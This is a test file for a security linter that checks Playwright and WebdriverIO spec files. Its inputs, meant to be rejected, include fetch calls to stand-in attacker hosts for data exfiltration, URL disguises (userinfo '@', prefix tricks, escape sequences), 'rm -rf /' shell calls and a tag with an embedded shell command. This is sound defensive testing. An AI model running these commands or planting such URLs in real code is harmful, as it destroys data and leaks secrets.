import { test } from 'node:test'
import assert from 'node:assert/strict'
import { writeFileSync, mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { execFileSync } from 'node:child_process'

const BIN = fileURLToPath(new URL('./ast-lint.mjs', import.meta.url))

function lint(content, ext = 'spec.ts', cfg = { allowedOrigins: ['http://localhost:3000'] }) {
  const dir = mkdtempSync(join(tmpdir(), 'astlint-'))
  const file = join(dir, `t.${ext}`)
  writeFileSync(file, content)
  const cfgFile = join(dir, 'cfg.json')
  writeFileSync(cfgFile, JSON.stringify(cfg))
  try {
    const out = execFileSync(process.execPath, [BIN, file, cfgFile], { encoding: 'utf8' })
    return { ok: true, out }
  } catch (e) {
    return { ok: false, out: e.stdout?.toString() || '', err: e.stderr?.toString() || '' }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

test('clean playwright file passes', () => {
  const r = lint(`
import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('ok', async ({ page }) => {
  await page.goto('http://localhost:3000/foo')
  await page.getByRole('button', { name: /submit/i }).click()
  await expect(page.getByRole('alert')).toBeVisible()
})
`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('eval is banned', () => {
  const r = lint(`eval("alert(1)")`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-dynamic-eval/)
})

test('page.evaluate template-literal banned', () => {
  const r = lint('import { test } from "@playwright/test"\ntest("x", async ({ page }) => { await page.evaluate(`alert(${1})`) })')
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-eval-via-page/)
})

test('child_process import banned', () => {
  const r = lint(`import { spawn } from 'child_process'`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-shell/)
})

test('node:child_process imports are banned, aliased or not', () => {
  for (const src of [
    `import { exec } from 'node:child_process'\nexec('ls')`,
    `import { execFile as run } from 'node:child_process'\nrun('ls')`,
    `import * as cp from "node:child_process"`,
    `const { spawnSync: go } = require('node:child_process')\ngo('ls')`,
    'const cp = await import(`node:child_process`)',
  ]) {
    const r = lint(src)
    assert.match(r.out, /no-shell: child_process import/, src)
  }
})

test('every child_process execution function is banned as a call', () => {
  for (const fn of ['exec', 'execFile', 'execSync', 'execFileSync', 'spawn', 'spawnSync', 'fork']) {
    const r = lint(`await ${fn}('rm -rf /')`)
    assert.match(r.out, /no-shell: child_process call/, fn)
  }
})

test('RegExp .exec( is not a shell call', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('x', async ({ page }) => {
  const id = /^BK-(\\d{8})$/.exec(await page.getByRole('heading').innerText())
  expect(id).not.toBeNull()
})`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('process.env direct read banned', () => {
  const r = lint(`const t = process.env.SECRET_TOKEN`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-raw-env/)
})

test('cross-origin fetch banned', () => {
  const r = lint(`await fetch('https://attacker.com/exfil')`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-cross-origin-fetch/)
})

test('fetch origins compare parsed origins, never string prefixes', () => {
  const cfg = { allowedOrigins: ['https://app.example', 'http://localhost:3000/'] }
  for (const url of [
    'https://app.example.attacker.test/exfil',
    'https://app.example@attacker.test/exfil',
    'http://localhost:30001/exfil',
    'HTTPS://ATTACKER.TEST/exfil',
    '//attacker.test/exfil',
    'http://local host:3000/exfil',
  ]) {
    assert.match(lint(`await fetch('${url}')`, 'spec.ts', cfg).out, /no-cross-origin-fetch/, url)
  }
  for (const url of ['https://app.example/api/x', 'https://APP.example:443/x', 'http://localhost:3000']) {
    assert.doesNotMatch(lint(`await fetch('${url}')`, 'spec.ts', cfg).out, /no-cross-origin-fetch/, url)
  }
})

test('an allowedOrigins entry that is not an http(s) URL is an invocation error', () => {
  const r = lint(`await fetch('https://app.example/x')`, 'spec.ts', { allowedOrigins: ['app.example'] })
  assert.equal(r.ok, false)
  assert.match(r.err, /allowedOrigins entry is not an http\(s\) URL/)
})

test('css selector banned', () => {
  const r = lint(`import { test } from "@playwright/test"\ntest('x', async ({ page }) => { await page.locator('.btn-primary').click() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /selector-policy/)
})

test('getByText exact-string banned (regex form required)', () => {
  const r = lint(`import { test } from "@playwright/test"\ntest('x', async ({ page }) => { await page.getByText('Save').click() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /selector-policy/)
})

test('getByText regex form passes', () => {
  const r = lint(`import { test, expect } from "@playwright/test"\ntest.describe.configure({ mode: 'parallel' })\ntest('x', async ({ page }) => { await page.getByText(/save|uložit/i).click() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('fs import is banned', () => {
  const r = lint(`import fs from 'node:fs'`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-fs/)
})

test('fs and fs/promises are banned in every load form', () => {
  for (const src of [
    `import { readFileSync } from'fs'`,
    'import { readFile as rf } from `node:fs`',
    `import 'node:fs'`,
    `const fs = await import('node:fs')`,
    `import { writeFile } from 'fs/promises'`,
    `const { readFile: rf } = require("node:fs/promises")`,
    `export { rm } from 'node:fs/promises'`,
  ]) {
    assert.match(lint(src).out, /no-fs: fs import/, src)
  }
  assert.doesNotMatch(lint(`import { createMachine } from 'fsm'`).out, /no-fs/)
})

test('browser_run_code_unsafe is banned', () => {
  const r = lint(`await browser_run_code_unsafe({ code: 'alert(1)' })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-unsafe-mcp/)
})

test('tag with shell chars is banned', () => {
  const r = lint(`import { test } from "@playwright/test"\ntest('x', { tag: ['@a;rm-rf', '@b'] }, async () => {})`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-tag-shell-chars/)
})

test('file with // header comment + bare spawn still triggers no-shell (C1 regression)', () => {
  const r = lint(`/*
SWEEP-ID: 2026-05-13-1200
FINDING-ID: F-2026-05-13-0001
*/
// AUTO-GENERATED-EXTEND BY /e2e
import { test } from '@playwright/test'
test('x', async () => { spawn('rm -rf /') })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-shell/)
})

// ─── Determinism rules (references/assertions.md) ───

test('require-isolation-metadata: Playwright spec without parallel-mode declaration is rejected', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test('x', async ({ page }) => { await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /require-isolation-metadata/)
})

test('require-isolation-metadata: INDEPENDENT: false header waives the check', () => {
  const r = lint(`/*
SWEEP-ID: 2026-05-13-1200
FINDING-ID: F-2026-05-13-0042
INDEPENDENT: false
DEFERRED-REASON: cleanup-impossible-third-party-billing
*/
import { test, expect } from '@playwright/test'
test.fixme('x', async ({ page }) => { await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('require-isolation-metadata: WDIO spec accepts runner isolation header', () => {
  const r = lint(`/*
SWEEP-ID: 2026-05-13-1200
FINDING-ID: F-2026-05-13-0043
INDEPENDENT: true
RUNNER-ISOLATED: true
*/
describe('mobile', () => {
  it('shows home', async () => { await $('~screen-home').waitForDisplayed() })
})`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('no-test-serial: test.describe.serial is banned', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test.describe.serial('flow', () => { test('a', async () => {}); test('b', async () => {}) })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-test-serial/)
})

test('no-test-serial: chained .serial() on describe is banned', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test.describe('flow', () => {}).serial(() => { test('a', async () => {}) })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-test-serial/)
})

test('no-test-serial: .serialize( does NOT false-positive', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('x', async ({ page }) => { const x = JSON.stringify({ a: 1 }); const y = obj.serialize(); await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('no-shared-mutable-module-state: top-level let is banned', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
let createdId = ''
test('x', async ({ page }) => { createdId = 'foo'; await expect(page.getByRole('button', { name: /go/i })).toBeVisible() })`)
  assert.equal(r.ok, false)
  assert.match(r.out + r.err, /no-shared-mutable-module-state/)
})

test('no-shared-mutable-module-state: top-level const is allowed', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
const FIXED = 'sweep-F-2026-05-13-0001-customer'
test('x', async ({ page }) => { await expect(page.getByText(new RegExp(FIXED))).toBeVisible() })`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('no-shared-mutable-module-state: let inside a test() body is allowed', () => {
  const r = lint(`import { test, expect } from '@playwright/test'
test.describe.configure({ mode: 'parallel' })
test('x', async ({ page }) => {
  let captured = ''
  captured = await page.getByRole('textbox', { name: /id/i }).inputValue()
  await expect(page.getByText(new RegExp(captured))).toBeVisible()
})`)
  assert.equal(r.ok, true, r.out + r.err)
})

test('a fetch URL literal with an escape sequence is refused, never decoded', () => {
  const cfg = { allowedOrigins: ['https://app.example'] }
  // Source text as written in a spec: JavaScript turns \@ / \x40 / @ into
  // "@", so the executed fetch would reach attacker.test.
  for (const url of [
    'https://app.example\\@attacker.test/exfil',
    'https://app.example\\x40attacker.test/exfil',
    'https://app.example\\u0040attacker.test/exfil',
  ]) {
    assert.match(lint(`await fetch('${url}')`, 'spec.ts', cfg).out, /escape sequence/, url)
  }
})
